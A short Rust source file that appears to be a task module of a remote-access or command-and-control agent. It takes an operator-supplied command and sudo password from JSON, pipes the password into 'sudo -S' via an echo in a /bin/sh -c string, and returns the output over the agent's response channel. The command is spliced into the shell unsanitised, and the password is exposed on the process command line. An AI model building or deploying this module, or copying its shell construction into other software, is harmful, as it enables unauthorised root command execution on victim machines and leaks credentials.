use crate::structs::Task;
use serde::Deserialize;
use tokio::process::Command;

#[derive(Deserialize)]
struct SudoArgs {
    command: String,
    #[serde(default)]
    password: String,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: SudoArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let shell_cmd = if !args.password.is_empty() {
        format!("echo '{}' | sudo -S {}", args.password.replace('\'', "'\\''"), args.command)
    } else {
        format!("sudo {}", args.command)
    };

    match Command::new("/bin/sh").arg("-c").arg(&shell_cmd).output().await {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            response.user_output = format!("{}{}", stdout, stderr);
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Sudo failed: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
